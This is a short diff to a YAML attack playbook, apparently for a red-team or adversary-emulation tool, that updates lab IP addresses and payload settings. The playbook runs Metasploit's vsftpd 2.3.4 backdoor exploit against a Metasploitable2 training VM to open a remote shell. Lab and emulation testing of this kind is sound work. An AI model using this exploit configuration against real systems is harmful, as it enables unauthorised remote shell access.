@@ -15,9 +15,9 @@
 #     3. Target a Metasploitable2-VM
 #
 vars:
-  METASPLOITABLE: 172.17.0.106
-  ATTACKER: 172.17.0.127
-  PAYLOAD: cmd/unix/interact
+  METASPLOITABLE: 192.168.0.146
+  ATTACKER: 192.168.0.29
+  PAYLOAD: payload/cmd/unix/interact
   INCLUDE_PATH: ./playbooks/includes
 
 commands:
@@ -28,10 +28,10 @@ commands:
   - type: msf-module
     creates_session: shell
     cmd: exploit/unix/ftp/vsftpd_234_backdoor
-    payload: $PAYLOAD
+      #payload: $PAYLOAD
     options:
       RHOSTS: $METASPLOITABLE
-      RPORT: 21
+      RPORT: "21"
 
   # Run command in spawned shell
   - type: msf-session
